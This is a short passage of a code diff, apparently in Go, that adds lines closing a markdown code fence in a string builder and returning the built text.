+		sections.WriteString("```\n\n")
+	}
+
+	return sections.String()
 }
